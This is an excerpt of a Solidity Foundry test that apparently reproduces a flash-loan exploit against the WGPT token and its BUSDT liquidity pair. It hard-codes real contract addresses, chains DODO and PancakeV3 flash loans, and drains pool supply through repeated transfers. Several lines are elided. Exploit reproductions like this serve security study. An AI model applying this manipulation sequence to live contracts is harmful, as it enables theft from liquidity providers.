...
contract WGPTTest is Test {
    ...
    IERC20 private constant ExpToken =
        IERC20(0xe1272a840F574b68dE861eC5009784e3411cb96c);
    IWGPT private constant WGPT =
        IWGPT(0x1f415255f7E2a8546559a553E962dE7BC60d7942);
    ...
    Uni_Pair_V2 private constant BUSDT_ExpToken =
        Uni_Pair_V2(0xaa07222e4c3295C4E881ac8640Fbe5fB921D6840);
    Uni_Pair_V2 private constant WGPT_BUSDT =
        Uni_Pair_V2(0x5a596eAE0010E16ed3B021FC09BbF0b7f1B2d3cD);
    ...
    function testExploit() public {
        ...
        bytes
            memory swapData = hex"";
        ...
        BUSDT_ExpToken.swap(
            BUSDT.balanceOf(address(BUSDT_ExpToken)) / 10,
            90e18,
            address(this),
            swapData
        );
    ...
    function DPPFlashLoanCall(
        ...
        if (msg.sender == address(DPPOracle1)) {
            ...
            PoolV3.flash(
                address(this),
                76_727_748_945_585_195_946_976,
                0,
                bytes("")
            );
        }
    ...
    function pancakeV3FlashCallback(
        ...
        while (WGPT_BUSDT.totalSupply() > 100_200 * 1e18) {
            WGPT.transferFrom(
                address(this),
                address(WGPT_BUSDT),
                WGPT.balanceOf(address(this)) / 99
            );
        ...
        deal(
            address(ExpToken),
            address(this),
            ExpToken.balanceOf(address(this)) + 400_000 * 1e18
        );
        path[0] = address(WGPT);
        path[1] = address(BUSDT);
        uint256[] memory amounts = Router.getAmountsOut(
            WGPT.balanceOf(address(this)) - 128e18,
            path
        );
